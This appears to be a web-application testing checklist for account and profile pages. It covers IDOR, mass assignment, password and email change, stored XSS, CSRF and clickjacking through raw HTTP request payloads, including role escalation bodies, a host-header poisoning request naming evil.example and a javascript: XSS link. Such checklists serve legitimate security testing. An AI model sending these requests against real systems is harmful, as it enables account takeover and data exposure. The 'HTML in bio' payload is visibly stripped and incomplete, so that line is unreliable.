title: Account / profile page
summary: Settings, profile, and account-change: IDOR, mass assignment, stored XSS, password/email change, CSRF, and clickjacking.

groups.title: Object authorization
groups.summary: Swap the id. That is most of profile testing.

checks.title: Horizontal read (IDOR)
checks.why: The handler trusts the user id in the path or query more than the caller.
checks.validate: Account A reads account B's profile, email, or settings. Confirm against a fresh authoritative read.

variants.name: Swap the path id
variants.payload:
GET /users/1002 HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>

variants.name: Numeric walk
variants.payload:
GET /api/v1/users/1000 HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
variants.expect: 1000, 1001, 1002. A 200 for another account is the finding. Stop after a few hits.

variants.name: Opaque id / UUID
variants.payload:
GET /api/v1/users/11111111-1111-1111-1111-111111111111 HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
variants.expect: Guessing is harder; still try B's real UUID captured from an invite, share link, or search.

checks.title: Horizontal update / delete
checks.why: A can change B's name, email, or delete B.
checks.validate: B's object changes after A's request. Confirm with B's session.

variants.name: PATCH the other id
variants.payload:
PATCH /api/v1/users/1002 HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"name":"wapt-marker"}
variants.expect: Read back as B. Also try POST /users/1002/delete and DELETE /users/1002.

variants.name: Body id retarget
variants.payload:
PATCH /api/v1/users/me HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"id":1002,"email":"attacker@example.com"}
variants.expect: Body id must not retarget the update. Also try user_id, account_id, uuid.

checks.title: Mass assignment on profile
checks.why: The binder accepts role, price, owner, or verified flags the UI never sends.
checks.validate: An unlisted property is stored and later returned or enforced.

variants.name: Hidden privilege fields
variants.payload:
PATCH /api/v1/users/me HTTP/1.1
Host: www.example.com
Authorization: Bearer <member-token>
Content-Type: application/json

{"role":"admin","isAdmin":true,"verified":true,"balance":9999}
variants.expect: Read the object back. role/isAdmin/verified/balance/tenant_id must be unchanged.

variants.name: Ownership reassignment
variants.payload:
PATCH /api/v1/projects/55 HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"owner_id":1002,"user_id":1002}
variants.expect: Must not move the object to B (or take B's object).

groups.title: Account change and client
groups.summary: Password/email change, stored XSS, CSRF, and framing of the settings page.

checks.title: Password change requires the current secret
checks.why: A stolen session can set a new password without knowing the old one, or the change binds to the wrong account.
checks.validate: The password changes without the current secret, or A's request changes B.

variants.name: Omit current password
variants.payload:
POST /account/password HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
Content-Type: application/json

{"password":"NewPass1!","new_password":"NewPass1!"}

variants.name: Swap target account
variants.payload:
POST /account/password HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
Content-Type: application/json

{"user_id":1002,"current_password":"A-password","new_password":"NewPass1!"}

checks.title: Email / identity change
checks.why: Changing the mailbox without re-auth or without verifying the new address takes the account.
checks.validate: The login identifier changes to an address you control without a confirm step.

variants.name: Direct email PATCH
variants.payload:
PATCH /api/v1/users/me HTTP/1.1
Host: www.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"email":"attacker@example.com"}
variants.expect: Must stay pending until the new inbox confirms. A silent swap is the finding.

variants.name: Host-poisoned confirm
variants.payload:
POST /account/email HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example
Cookie: session=<account-A>
Content-Type: application/json

{"email":"tester@example.com"}
variants.expect: Confirm mail must still point at the canonical origin.

checks.title: Stored XSS on profile
checks.why: Name, bio, location, or a rich-text field is rendered into HTML for other users or admins.
checks.validate: A marker you stored executes in a realistic viewer context.

variants.name: HTML in bio
variants.payload: PATCH /api/v1/users/me HTTP/1.1 Host: www.example.com Authorization: Bearer Content-Type: application/json {"bio":"","name":"
variants.expect: View as B and in any admin/moderation queue. Self-XSS alone is not enough.

variants.name: Markdown / rich text
variants.payload: PATCH /api/v1/users/me HTTP/1.1 Host: www.example.com Authorization: Bearer Content-Type: application/json {"bio":"[ok](javascript:alert(1))\n"}
variants.expect: Markdown and sanitizer bypasses are the same class. Confirm in the rendered page.

checks.title: CSRF on settings
checks.why: A cross-site POST changes email, password, or a notification destination.
checks.validate: A cross-origin form changes state in the victim session.

variants.name: Cross-site email change
variants.expect: Must fail without a valid CSRF token. SameSite=Lax does not stop POST on some older browsers — still require a token.

variants.name: JSON as text/plain
variants.payload:
POST /api/v1/users/me HTTP/1.1
Host: www.example.com
Content-Type: text/plain
Origin: https://evil.example
Cookie: session=<victim>

{"email":"attacker@example.com"}
variants.expect: Must not change state. This is the classic simple-request CSRF shape.

checks.title: Clickjacking the settings page
checks.why: A third-party page can frame settings and steal a click on delete, disable MFA, or change email.
checks.validate: A cross-origin iframe of /settings either fails to load or there is no sensitive control.

variants.name: Read framing headers
variants.payload:
GET /settings HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: Content-Security-Policy: frame-ancestors 'none' (or an explicit allowlist). X-Frame-Options: DENY or SAMEORIGIN.

variants.name: Cross-origin iframe
variants.expect: The iframe stays blank / errors when frame-ancestors or XFO is set. If settings render, framing is allowed.
